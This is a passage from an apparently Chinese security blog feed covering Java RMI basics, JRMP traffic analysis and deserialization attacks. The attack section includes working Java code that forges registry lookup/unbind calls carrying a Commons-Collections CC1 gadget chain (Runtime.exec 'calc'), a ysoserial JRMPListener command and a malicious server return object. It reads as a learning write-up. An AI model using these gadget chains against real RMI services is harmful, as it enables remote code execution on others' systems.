class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看原本的lookup, 逐步分析我们自己的lookup是如何伪造的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214158257.png" alt="image-20240710214158257"></p><p>首先是90行的newCall的调用, 我们必须得先获取到这个ref属性</p><p>我们根据继承关系找到这个ref定义的位置, 也就是RegistryImpl_Stub的父类的父类RemoteObject</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214603105.png" alt="image-20240710214603105"></p><p>因此我们就可以这样来反射获取它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>在newCall方法中有一个operations参数, 也需要反射获取, 这个值就在RegistryImpl_Stub中, 是一个私有常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>接下来照着lookup中的形式编写代码即可, 但在写入数据时, 我们写入恶意对象remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br></pre></td></tr></table></figure><p>这里的ref.invoke就意味着进行网络传输了</p><p>对于unbind也是类似的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710215616245.png" alt="image-20240710215616245"></p><p>稍微修改一下即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ref.invoke(var2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>在进行bind unbind rebind list lookup这些操作时, 除了unbind rebind, 客户端都是会接收服务端返回的数据并进行反序列化的, 只要我们伪造一个注册中心, 返回恶意数据, 就能对客户端发起攻击</p><p>利用脚本太长, 直接用ysoserial现成的exp来验证了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240711143215299.png" alt="image-20240711143215299"></p><p>注意要用低版本的java, 我环境变量里是java18是运行不了的, 这里直接换到java1.8的目录里去执行</p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p> 这里也比较好理解, 客户端调用远程方法, 服务端返回结果, 这个结果可以是一个对象, 客户端接收这个对象, 这过程服务端序列化对象, 客户端反序列化对象, 使得客户端易受攻击</p><p> 重写服务器上的远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;CC1&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> CC1();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">iHello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) iHello.sayHello(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是服务器返回恶意对象</p><p>另一种是加载远程对象</p><p>当服务器返回了一个客户端位置的类的对象时, 客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>这个利用条件相当苛刻</p><p>只有如下条件的服务器才能被攻击：</p><ol><li>设置了java.rmi.server.useCodebaseOnly&#x3D;false，或者java版本低于7u21、6u45（低于这几个版本默认为false）</li><li>设置<code>System.*setSecurityManager*(new RMISecurityManager());</code></li></ol><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h3><p>客户端和服务端传输对象都是序列化反序列化进行的, 因此可以互相打</p><p>对于服务端, 它需要有一个受攻击的方法, 接收一个对象作为参数, 这样在客户端传入恶意对象后, 服务端将其反序列化从而受到攻击</p><p>比较简单不做演示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;客户端攻击注册中心&quot;&gt;&lt;a href=&quot;#客户端攻击注册中心&quot; class=&quot;headerlink&quot; title=&quot;客户端攻击注册中心&quot;&gt;&lt;/a&gt;客户端攻击注册中心&lt;/h2&gt;&lt;p&gt;客户端请求注册中心有 list, bind, rebind, unbind, loo</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="http://example.com/2024/06/06/Java-RMI/"/>
    <id>http://example.com/2024/06/06/Java-RMI/</id>
    <published>2024-06-06T01:55:14.000Z</published>
    <updated>2024-07-10T05:50:30.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a></p><p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></p><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><h2 id="RMI的几个重要部分"><a href="#RMI的几个重要部分" class="headerlink" title="RMI的几个重要部分"></a>RMI的几个重要部分</h2><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）</li></ul><h3 id="远程对象调用"><a href="#远程对象调用" class="headerlink" title="远程对象调用"></a>远程对象调用</h3><blockquote><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-80.png" alt="图片-80"></p><h2 id="测试RMI"><a href="#测试RMI" class="headerlink" title="测试RMI"></a>测试RMI</h2><p>我创建了两个项目, 用于测试服务端和客户端</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>IHello.java 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer.java</p><ul><li><p>实现 <code>IHello</code> 远程接口, 实现<code>Registry</code></p></li><li><p>继承 <code>UnicastRemoteObject</code> 类，用于生成 Stub（存根）和 Skeleton（骨架）。</p></li><li><p>实现类中使用的对象必须都可序列化，即都继承<code>java.io.Serializable</code></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里bind有两种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>区别是一个需要加<code>rmi://0.0.0.0:1099/</code>一个不需要</p><p>我后面图片中可能有的地方书写有误, 不过bind的地方流程比较简单, 不影响分析</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。</p><p>当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>IHello.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(ihello.sayHello(<span class="string">&quot;hello, n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client成功调用了Server的对象和方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606144439733.png" alt="image-20240606144439733"></p><h2 id="JRMP协议分析"><a href="#JRMP协议分析" class="headerlink" title="JRMP协议分析"></a>JRMP协议分析</h2><p>我们将CLi端打包放进虚拟机中运行, 抓包分析rmi过程产生的流量,注意改一下ip</p><p>为cli项目添加入口类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新版本或适合您项目的版本 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 指定主类的全路径名称 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>org.rmi.RMIClient<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用maven打包即可</p><p>wireShark抓包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606155805887.png" alt="image-20240606155805887"></p><p>首先我们可以看见进行了TCP的三次握手, 建立了一条TCP链</p><p>其中192.168.1.11服务端, 192.168.244.128为客户端</p><p>这里我们也可以看见实际上是连接的1099端口(也就是Registry), 然后二者建立JRMP链接</p><p>随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”。我们看一下Registry的回复内容。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606160324349.png" alt="image-20240606160324349"></p><p>以下是ReturnData的内容</p><figure 